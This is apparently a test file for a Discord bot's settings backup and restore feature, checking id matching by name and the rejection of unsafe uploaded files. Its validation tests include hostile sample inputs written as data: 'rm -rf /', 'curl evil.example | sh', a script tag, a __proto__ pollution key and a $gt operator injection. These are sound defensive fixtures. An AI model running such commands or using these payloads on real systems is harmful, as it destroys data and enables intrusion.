import {
	BACKUP_LIMITS,
	backupDocument,
	type BackupFile,
	buildBackup,
	placeKind,
	planBackup,
	readBackupFile,
	runsAsProgram,
} from "@testify/shared";

const SOURCE_STARS = "100000000000000001";
const HERE_STARS = "200000000000000001";
const SOURCE_DJ = "100000000000000002";
const HERE_DJ = "200000000000000002";
const SOURCE_GONE = "100000000000000003";

const source = {
	channels: [{ id: SOURCE_STARS, name: "Hall-of-fame" }],
	roles: [
		{ id: SOURCE_DJ, name: "DJ" },
		{ id: SOURCE_GONE, name: "Old role" },
	],
};
const here = {
	channels: [
		{ id: HERE_STARS, name: "hall-of-fame" },
		{ id: "200000000000000009", name: null },
	],
	roles: [{ id: HERE_DJ, name: "dj" }],
};

const settingsAnswer = {
	prefix: { prefix: "!", enabled: true },
	antiLink: { enabled: false, bypassPermission: "ManageMessages" },
};

const reads = {
	"starboard.update": { enabled: true, channelId: SOURCE_STARS, threshold: 5, selfStar: false, posts: 12 },
	"music.update": { enabled: true, djRoleIds: [SOURCE_DJ, SOURCE_GONE], canPlay: true },
	"settings.prefix": settingsAnswer,
	"settings.anti-link": settingsAnswer,
};

describe("buildBackup", () => {
	/** A backup holds only what Put back could send, and the names of what it points at, so a copy can find its own. */
	it("keeps each section's restorable fields and the names of the channels and roles they name", () => {
		const document = buildBackup("Source", reads, source, new Date("2026-11-06T12:00:00Z"));

		expect(document.sections["starboard.update"]).toEqual({
			enabled: true,
			channelId: SOURCE_STARS,
			threshold: 5,
			selfStar: false,
		});
		expect(document.sections["settings.prefix"]).toEqual({ prefix: "!", enabled: true });
		expect(document.sections["settings.anti-link"]).toEqual({ enabled: false, bypassPermission: "ManageMessages" });
		expect(document.channels).toEqual({ [SOURCE_STARS]: "Hall-of-fame" });
		expect(document.roles).toEqual({ [SOURCE_DJ]: "DJ", [SOURCE_GONE]: "Old role" });
		expect(backupDocument.safeParse(document).success).toBe(true);
	});
});

describe("planBackup", () => {
	const document = buildBackup("Source", reads, source);

	/** Ids from another server mean nothing here, so they are matched by name and anything with no match is said. */
	it("moves ids to what is called the same here, and names what it could not find", () => {
		const { steps } = planBackup(document, here, {});
		const starboard = steps.find((step) => step.action === "starboard.update");
		const music = steps.find((step) => step.action === "music.update");

		expect(starboard?.body.channelId).toBe(HERE_STARS);
		expect(starboard?.path).toBe("/starboard");
		expect(music?.body.djRoleIds).toEqual([HERE_DJ]);
		expect(music?.missing).toEqual([{ kind: "role", name: "Old role" }]);
	});

	it("keeps an id this server has, leaves out a field with no match, and never points at a channel nobody can see", () => {
		const own = buildBackup("Here", { "starboard.update": { enabled: true, channelId: HERE_STARS } }, here);
		expect(planBackup(own, here, {}).steps[0]?.body.channelId).toBe(HERE_STARS);

		const hidden = buildBackup("Elsewhere", { "starboard.update": { channelId: "200000000000000009" } }, here);
		expect(planBackup(hidden, here, {})).toMatchObject({
			steps: [],
			left: [{ action: "starboard.update", missing: [{ kind: "channel", name: null }] }],
		});
	});

	/** Sending an empty list would take away every DJ role this server already has. */
	it("leaves a list alone when nothing in it is found here", () => {
		const elsewhere = buildBackup("Elsewhere", { "music.update": { enabled: true, djRoleIds: [SOURCE_GONE] } }, source);
		const music = planBackup(elsewhere, here, {}).steps[0];

		expect(music?.body).toEqual({ enabled: true });
		expect(music?.missing).toEqual([{ kind: "role", name: "Old role" }]);
	});

	it("marks a section this server already matches", () => {
		const current = { "starboard.update": { enabled: true, channelId: HERE_STARS, threshold: 5, selfStar: false } };

		expect(
			planBackup(document, here, current).steps.find((step) => step.action === "starboard.update")?.unchanged,
		).toBe(true);
	});

	/** A file can be edited by hand, and a value the route would refuse is better reported than sent. */
	it("refuses a section the route's own schema would refuse, and ignores fields Put back could never send", () => {
		const edited = {
			...document,
			sections: {
				"starboard.update": { threshold: -4, publish: true },
				"levelling.update": { enabled: true, reset: true },
			},
		};
		const plan = planBackup(edited, here, {});

		expect(plan.unusable).toEqual(["starboard.update"]);
		expect(plan.steps.map((step) => step.body)).toEqual([{ enabled: true }]);
	});
});

describe("readBackupFile", () => {
	const valid = buildBackup("Testify HQ", reads, source);
	const json = (value: unknown): string => JSON.stringify(value);
	const file = (content: string | number[], name = "backup.json", type = "application/json"): BackupFile => ({
		name,
		type,
		bytes: typeof content === "string" ? new TextEncoder().encode(content) : Uint8Array.from(content),
	});
	const withSections = (sections: unknown): string => json({ ...valid, sections });

	/** A file is whatever somebody chose, so nothing in it may be read as settings until it is plainly a backup. */
	it("refuses programs, scripts, archives and anything else that is not exactly a backup", () => {
		const cases: Record<string, [BackupFile, string]> = {
			"a Windows program": [file([0x4d, 0x5a, 0x90, 0x00]), "program"],
			"a Linux program": [file([0x7f, 0x45, 0x4c, 0x46, 0x02]), "program"],
			"a shell script": [file("#!/bin/bash\nrm -rf /\n"), "program"],
			"a zip": [file([0x50, 0x4b, 0x03, 0x04, 0x14]), "program"],
			"a picture, which is not text": [file([0x89, 0x50, 0x4e, 0x47, 0x0d]), "program"],
			"a backup named .exe": [file(json(valid), "backup.exe"), "notJson"],
			"a double extension": [file(json(valid), "backup.json.exe"), "notJson"],
			"a script's type": [file(json(valid), "backup.json", "text/x-sh"), "notJson"],
			"a page with a script": [file("<script>alert(1)</script>"), "notBackup"],
			"a script without a #!": [file("echo hi && curl evil.example | sh"), "notBackup"],
			"nesting no backup has": [file(`{"kind":${"[".repeat(100_000)}${"]".repeat(100_000)}}`), "notBackup"],
			"a prototype key": [
				file(json(valid).replace('"channels":{', '"channels":{"__proto__":{"polluted":true},')),
				"notBackup",
			],
			"a key a backup never has": [file(json({ ...valid, run: "process.exit()" })), "notBackup"],
			"a section a backup never has": [file(withSections({ "eval.run": { code: "1" } })), "notBackup"],
			"a field Put back never sends": [file(withSections({ "starboard.update": { publish: true } })), "notBackup"],
			"a database operator as a value": [
				file(withSections({ "starboard.update": { threshold: { $gt: 0 } } })),
				"notBackup",
			],
			"a place named by something but an id": [file(json({ ...valid, channels: { general: "x" } })), "notBackup"],
			"too large": [file(" ".repeat(BACKUP_LIMITS.maxBytes + 1)), "tooLarge"],
		};

		const refused = Object.fromEntries(Object.entries(cases).map(([label, [input]]) => [label, readBackupFile(input)]));
		expect(refused).toEqual(
			Object.fromEntries(Object.entries(cases).map(([label, [, expected]]) => [label, expected])),
		);
		expect(({} as Record<string, unknown>).polluted).toBeUndefined();
	});

	/** The values sent on are what each route's schema made of them, so hidden and control characters never leave. */
	it("reads a real backup, and sends its settings cleaned", () => {
		const text = json({
			...valid,
			guildName: "Testify\u202e HQ",
			sections: { ...valid.sections, "goodbye.update": { message: "Bye\u200b {user}\u0007" } },
		});
		const read = readBackupFile(file(`\uFEFF${text}`, "Testify-HQ.JSON", ""));
		if (typeof read === "string") throw new Error(`Refused as ${read}.`);

		expect(read.guildName).toBe("Testify HQ");
		expect(planBackup(read, here, {}).steps.find((step) => step.action === "goodbye.update")?.body).toEqual({
			message: "Bye {user}",
		});
	});

	/** Discord allows a role called `<Staff>`, which the read refuses as HTML, so its own download once never read back. */
	it("reads back a backup from a server whose names look like tags, and still matches them by name", () => {
		const tagged = { channels: [], roles: [{ id: SOURCE_DJ, name: "<Staff>" }] };
		const written = buildBackup("<Mods> HQ", { "music.update": { djRoleIds: [SOURCE_DJ] } }, tagged);
		const read = readBackupFile(file(json(written)));
		if (typeof read === "string") throw new Error(`Refused as ${read}.`);

		const elsewhere = { channels: [], roles: [{ id: HERE_DJ, name: "<staff>" }] };
		expect(read.guildName).toBe("‹Mods> HQ");
		expect(planBackup(read, elsewhere, {}).steps[0]?.body).toEqual({ djRoleIds: [HERE_DJ] });
	});
});

describe("runsAsProgram", () => {
	/** Only a program or a script blacklists its chooser; a picture, an archive or a document is somebody's mistake. */
	it("tells a program or a script from every other file", () => {
		const heads: Record<string, [number[], boolean]> = {
			"a Windows program": [[0x4d, 0x5a, 0x90], true],
			"a Linux program": [[0x7f, 0x45, 0x4c, 0x46], true],
			"a macOS program": [[0xcf, 0xfa, 0xed, 0xfe], true],
			"a 32-bit macOS program": [[0xce, 0xfa, 0xed, 0xfe], true],
			"a universal program or Java class": [[0xca, 0xfe, 0xba, 0xbe], true],
			"a script": [[0x23, 0x21, 0x2f], true],
			"a zip": [[0x50, 0x4b, 0x03, 0x04], false],
			"a PDF": [[0x25, 0x50, 0x44, 0x46], false],
			"a picture": [[0x89, 0x50, 0x4e, 0x47], false],
			"a backup": [[0x7b, 0x22, 0x6b], false],
			"a script behind a byte-order mark": [[0xef, 0xbb, 0xbf, 0x23, 0x21], false],
		};

		const judged = Object.fromEntries(
			Object.entries(heads).map(([label, [bytes]]) => [label, runsAsProgram(Uint8Array.from(bytes))]),
		);
		expect(judged).toEqual(Object.fromEntries(Object.entries(heads).map(([label, [, expected]]) => [label, expected])));
	});
});

describe("placeKind", () => {
	it("reads a field as a channel or a role by the reach check's own rule", () => {
		expect([
			placeKind("lobbyChannelId"),
			placeKind("categoryId"),
			placeKind("djRoleIds"),
			placeKind("threshold"),
		]).toEqual(["channel", "channel", "role", null]);
	});
});
